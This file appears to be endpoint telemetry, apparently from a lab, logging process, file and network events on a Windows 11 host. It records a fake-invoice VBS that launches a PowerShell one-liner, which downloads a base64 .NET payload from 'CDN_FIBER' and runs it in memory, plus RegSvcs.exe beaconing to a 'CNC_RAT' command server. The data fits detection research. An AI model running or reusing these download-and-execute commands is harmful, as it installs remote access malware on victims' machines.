host,processUUID,processName,event,objectType,objectData,objectUUID,timestamp,CommandLine
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,67baf09b-731f-47a1-8d0b-b9d793b73d51,29:17.4,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,cd7cfbfc-6eb9-4934-8286-db2d1d767594,29:20.9,
win11,cd7cfbfc-6eb9-4934-8286-db2d1d767594,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,29:20.9,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,cd7cfbfc-6eb9-4934-8286-db2d1d767594,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,f909052f-ccac-4acb-b4a2-a6259637c6ab,29:20.9,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,7c5874f4-31b6-450a-8885-5019d3978794,29:41.7,
win11,7c5874f4-31b6-450a-8885-5019d3978794,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,29:41.8,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,7c5874f4-31b6-450a-8885-5019d3978794,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,a3d059d9-004c-4893-a4d6-7ef2840afaec,29:41.8,
win11,a3e270c9-4248-4121-a3d9-4139eab5bb35,-,send,dns,cdn_fiber,1c0b87a6-c7a0-4c27-a8df-0425026d4332,29:47.6,
win11,a3e270c9-4248-4121-a3d9-4139eab5bb35,-,receive,dns,192.168.150.104:0,6662adb4-136c-4291-8c2e-e8d8f0f83c35,29:47.6,
win11,a3e270c9-4248-4121-a3d9-4139eab5bb35,-,send,dns,cdn_fsociety,0b19c493-265c-4142-a098-b5d837405371,29:47.7,
win11,662e15ca-4ddf-44c9-9a21-c806364b4768,-,send,dns,cdn_fiber,1c0b87a6-c7a0-4c27-a8df-0425026d4332,29:56.0,
win11,662e15ca-4ddf-44c9-9a21-c806364b4768,-,receive,dns,192.168.150.104:0,6662adb4-136c-4291-8c2e-e8d8f0f83c35,29:56.0,
win11,662e15ca-4ddf-44c9-9a21-c806364b4768,-,send,dns,cdn_fsociety,0b19c493-265c-4142-a098-b5d837405371,29:56.0,
win11,5c7764b4-9ed5-4600-a118-94b0ded04288,-,send,dns,cdn_fiber,1c0b87a6-c7a0-4c27-a8df-0425026d4332,29:57.7,
win11,5c7764b4-9ed5-4600-a118-94b0ded04288,-,receive,dns,192.168.150.104:0,6662adb4-136c-4291-8c2e-e8d8f0f83c35,29:57.7,
win11,5c7764b4-9ed5-4600-a118-94b0ded04288,-,send,dns,cdn_fsociety,0b19c493-265c-4142-a098-b5d837405371,29:57.7,
win11,b0f99457-1d77-41b7-b064-e641a8176f08,-,send,dns,cdn_fiber,1c0b87a6-c7a0-4c27-a8df-0425026d4332,29:58.1,
win11,b0f99457-1d77-41b7-b064-e641a8176f08,-,receive,dns,192.168.150.104:0,6662adb4-136c-4291-8c2e-e8d8f0f83c35,29:58.1,
win11,b0f99457-1d77-41b7-b064-e641a8176f08,-,send,dns,cdn_fsociety,0b19c493-265c-4142-a098-b5d837405371,29:58.1,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,a91e8603-9351-40a4-8547-3a6fc4bac737,29:58.5,
win11,a91e8603-9351-40a4-8547-3a6fc4bac737,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,29:58.6,explorer.exe C:\Users\Public\Documents
win11,a91e8603-9351-40a4-8547-3a6fc4bac737,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,82950fe3-f85d-48b9-86f9-5c534b7e4cd6,29:58.6,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,9f100f2d-4c75-4991-866a-adf4ee4401f0,29:58.6,
win11,2439d96c-1a3a-43fe-a0e8-eb756cb789ea,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,send,dns,CNC_RAT,105fcb3b-bc64-4c9e-83f1-26f2c1ce6a26,30:01.4,
win11,2439d96c-1a3a-43fe-a0e8-eb756cb789ea,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,receive,dns,192.168.150.104:0,6662adb4-136c-4291-8c2e-e8d8f0f83c35,30:01.4,
win11,2439d96c-1a3a-43fe-a0e8-eb756cb789ea,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,send,socket,192.168.150.104:8808.0,949829ea-ebbc-4806-8ab3-fd232656a5ef,30:01.5,
win11,2439d96c-1a3a-43fe-a0e8-eb756cb789ea,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,receive,socket,192.168.150.104:8808.0,949829ea-ebbc-4806-8ab3-fd232656a5ef,30:01.5,
win11,9f100f2d-4c75-4991-866a-adf4ee4401f0,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,30:05.1,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,9f100f2d-4c75-4991-866a-adf4ee4401f0,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,46e0517f-dda0-4c49-abe2-71bc8a319330,30:05.1,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,d7daf16b-7738-4898-9bca-b832bb700b6e,30:09.9,
win11,d7daf16b-7738-4898-9bca-b832bb700b6e,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,30:09.9,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,d7daf16b-7738-4898-9bca-b832bb700b6e,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,ed4a8e64-2737-464f-b2cc-8bd6f0b181fc,30:09.9,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,1dc9649e-41c2-4813-b77b-07a0a36a78e8,30:13.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,628167d8-669a-4e96-ba59-8589b1e93f74,30:14.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,337dfe40-2dab-4235-a62d-6c58b2ba3fcc,30:15.0,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,c909fbd9-f868-47b4-bb11-3c6dbc01e82a,30:15.8,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,d00d2934-5515-4eb2-851d-e3d5c8a4c3fb,30:16.3,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,45733867-b30d-4b21-9224-f837a0293be5,30:17.1,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,b1a187c7-cd3b-4150-8c35-7ff8077037a9,30:34.7,
win11,b1a187c7-cd3b-4150-8c35-7ff8077037a9,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,30:34.7,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,b1a187c7-cd3b-4150-8c35-7ff8077037a9,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,85c2d501-16a7-47ce-bcba-ebd644a248e5,30:34.7,
win11,788c1be2-97b4-4908-aa5d-ff2ff7b710c2,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,send,socket,20.189.173.23:443.0,b13ef148-cab6-4143-9b46-14b704f34320,30:38.2,
win11,788c1be2-97b4-4908-aa5d-ff2ff7b710c2,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,receive,socket,20.189.173.23:443.0,b13ef148-cab6-4143-9b46-14b704f34320,30:38.2,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,83f94efb-5eaa-49ed-a320-e2e605f80623,30:47.5,
win11,83f94efb-5eaa-49ed-a320-e2e605f80623,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,30:47.6,explorer.exe C:\Users\Public\Documents
win11,83f94efb-5eaa-49ed-a320-e2e605f80623,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,e47b3252-9c67-410c-938e-df33bb8116ba,30:47.6,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,eb0e29bd-54de-4da4-934b-ad9bba66b9df,30:47.6,
win11,eb0e29bd-54de-4da4-934b-ad9bba66b9df,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,30:54.1,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,eb0e29bd-54de-4da4-934b-ad9bba66b9df,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,2e7ab6f4-9f28-4fbc-aa89-da540cad44d0,30:54.1,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,5313c200-8d67-400e-9ef3-1ef0bc53a857,30:59.0,
win11,5313c200-8d67-400e-9ef3-1ef0bc53a857,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,30:59.0,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,5313c200-8d67-400e-9ef3-1ef0bc53a857,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,3b21b3e1-cc26-480d-86c2-466cd75ca123,30:59.0,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,26a20bc8-7440-4bae-bb5d-00c61035a816,31:11.8,
win11,26a20bc8-7440-4bae-bb5d-00c61035a816,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,31:11.9,explorer.exe C:\Users\Public\Documents
win11,26a20bc8-7440-4bae-bb5d-00c61035a816,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,926ebba8-6cc6-4a7a-b58e-09cf6266e1f4,31:11.9,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,a091432f-03b4-4172-953e-bf54b16b47c8,31:11.9,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,5a99557f-7f62-46ca-afef-d7c624f5003f,31:13.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,70136c54-2608-4703-860e-caf90d3db674,31:14.3,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,f9e73241-94ff-4173-9227-7427bb0d0a78,31:15.0,
win11,6b2c453f-8a60-46ff-88c2-bbf10c3e569b,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,send,socket,20.189.173.23:443.0,b13ef148-cab6-4143-9b46-14b704f34320,31:15.5,
win11,6b2c453f-8a60-46ff-88c2-bbf10c3e569b,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,receive,socket,20.189.173.23:443.0,b13ef148-cab6-4143-9b46-14b704f34320,31:15.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,05b40b8b-9d87-41e1-a93d-c7abd1239355,31:15.8,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,74f09c16-5737-471d-8633-d837d4a7f006,31:16.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,d1e9e2d1-5499-4990-84f7-7a954d355ec1,31:17.3,
win11,a091432f-03b4-4172-953e-bf54b16b47c8,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,31:18.4,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,a091432f-03b4-4172-953e-bf54b16b47c8,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,b43e7d5d-8a77-43fa-ab47-fcc67eb20319,31:18.4,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,48a7a9ce-b68f-45ac-bcd7-7b64e51ac9c8,31:28.2,
win11,48a7a9ce-b68f-45ac-bcd7-7b64e51ac9c8,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,31:28.3,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,48a7a9ce-b68f-45ac-bcd7-7b64e51ac9c8,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,5f308ba7-9fef-48e0-80d3-043916534557,31:28.3,
win11,f401a733-80e5-4d52-9a7e-6c7d2e3fab08,C:\Program Files\totalcmd\TOTALCMD64.EXE,execute,file,C:\Windows\System32\wscript.exe,f888b8e0-8e76-4db7-a3c3-e9d34ad77fef,31:40.2,"""C:\windows\System32\WScript.exe"" ""C:\Users\user\Downloads\factura-228447578537.pdf.vbs"""
win11,f401a733-80e5-4d52-9a7e-6c7d2e3fab08,C:\Program Files\totalcmd\TOTALCMD64.EXE,fork,process,C:\Windows\System32\wscript.exe,a61f9823-d8c6-49a3-96c3-04bfe63d2e0a,31:40.2,
win11,a61f9823-d8c6-49a3-96c3-04bfe63d2e0a,C:\Windows\System32\wscript.exe,execute,file,C:\Windows\System32\cmd.exe,ba01a43e-9c47-48f5-81b3-3f87adc8d086,31:40.3,"""C:\windows\system32\cmd.exe"" /c powershell.exe [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win11,a61f9823-d8c6-49a3-96c3-04bfe63d2e0a,C:\Windows\System32\wscript.exe,fork,process,C:\Windows\System32\cmd.exe,e8509b67-64fa-4840-98a8-fbac548343e7,31:40.3,
win11,e8509b67-64fa-4840-98a8-fbac548343e7,C:\Windows\System32\cmd.exe,execute,file,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6d41b2d8-7340-409e-8e15-fabf018cc2c7,31:40.3,"powershell.exe  [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win11,e8509b67-64fa-4840-98a8-fbac548343e7,C:\Windows\System32\cmd.exe,fork,process,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,410dd107-77c9-45d5-afb6-b31c997925a1,31:40.3,
win11,410dd107-77c9-45d5-afb6-b31c997925a1,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\AppData\Local\Temp\__PSScriptPolicyTest_yadvotk0.ocb.ps1,f25fd808-918a-40e2-94b9-4a8881b8a903,31:40.4,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,b2250434-8c98-4925-8cec-3ae1dd5d78a7,31:44.1,
win11,b2250434-8c98-4925-8cec-3ae1dd5d78a7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,31:44.2,explorer.exe C:\Users\Public\Documents
win11,b2250434-8c98-4925-8cec-3ae1dd5d78a7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,b2ade1a4-3f6c-4375-8097-db28e8691e58,31:44.2,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,523a16de-1422-4ca3-806d-18abc07c9ad0,31:44.2,
win11,523a16de-1422-4ca3-806d-18abc07c9ad0,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,31:50.7,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,523a16de-1422-4ca3-806d-18abc07c9ad0,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,470e009e-d651-47da-b56f-98864c6737cc,31:50.7,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,74a369eb-7eb5-4596-a018-57428c06de76,31:55.5,
win11,74a369eb-7eb5-4596-a018-57428c06de76,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,31:55.6,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,74a369eb-7eb5-4596-a018-57428c06de76,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,a7781190-36b0-445a-b19d-688568a2fbb7,31:55.6,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,878730f1-d953-4e84-b385-cf9aefc16400,32:08.5,
win11,878730f1-d953-4e84-b385-cf9aefc16400,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,32:08.6,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,878730f1-d953-4e84-b385-cf9aefc16400,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,1669b95d-de90-40f5-b45e-f5c5d5365e21,32:08.6,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,17f56f6a-aa8e-4126-8246-1d355f4da9c0,32:13.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,fadb8fd6-53ae-419b-941e-26adbd339dd1,32:14.1,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,face9dd0-99b5-4b3b-af01-0994880e5b95,32:14.9,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,12c78dc0-eeb7-4c17-b7bf-c3712828ef12,32:15.6,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,4514ba4a-e9b4-4e40-80e4-dd11e367983b,32:16.4,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,1fdf7f0b-e31f-4401-9f32-6d091962aa4c,32:17.0,
win11,33aba396-3dbf-44f6-982d-52797581334b,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,send,socket,20.189.173.13:443.0,3c57c2b8-3e25-4f37-a32c-692a16023f12,32:24.6,
win11,33aba396-3dbf-44f6-982d-52797581334b,C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE,receive,socket,20.189.173.13:443.0,3c57c2b8-3e25-4f37-a32c-692a16023f12,32:24.6,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,69ff7882-e9fd-4e88-b3f4-6890112e043f,32:26.3,
win11,69ff7882-e9fd-4e88-b3f4-6890112e043f,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,32:26.4,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,69ff7882-e9fd-4e88-b3f4-6890112e043f,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,26678ba7-5011-4e8d-a8f2-c47ae75bec96,32:26.4,
win11,f401a733-80e5-4d52-9a7e-6c7d2e3fab08,C:\Program Files\totalcmd\TOTALCMD64.EXE,fork,process,C:\Windows\System32\wscript.exe,e0d996fd-2f3a-4948-8f12-4082fa77c15e,32:30.1,
win11,e0d996fd-2f3a-4948-8f12-4082fa77c15e,C:\Windows\System32\wscript.exe,execute,file,C:\Windows\System32\cmd.exe,ba01a43e-9c47-48f5-81b3-3f87adc8d086,32:30.1,"""C:\windows\system32\cmd.exe"" /c powershell.exe [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win11,e0d996fd-2f3a-4948-8f12-4082fa77c15e,C:\Windows\System32\wscript.exe,fork,process,C:\Windows\System32\cmd.exe,2ae7e360-e29e-40c9-96ff-fb13d2272ca4,32:30.1,
win11,2ae7e360-e29e-40c9-96ff-fb13d2272ca4,C:\Windows\System32\cmd.exe,execute,file,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6d41b2d8-7340-409e-8e15-fabf018cc2c7,32:30.2,"powershell.exe  [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win11,2ae7e360-e29e-40c9-96ff-fb13d2272ca4,C:\Windows\System32\cmd.exe,fork,process,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a3e270c9-4248-4121-a3d9-4139eab5bb35,32:30.2,
win11,a3e270c9-4248-4121-a3d9-4139eab5bb35,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\AppData\Local\Temp\__PSScriptPolicyTest_tmqainsq.rin.ps1,d97b1ed4-fb83-4e88-95bf-a6a51a8eb8f5,32:30.3,
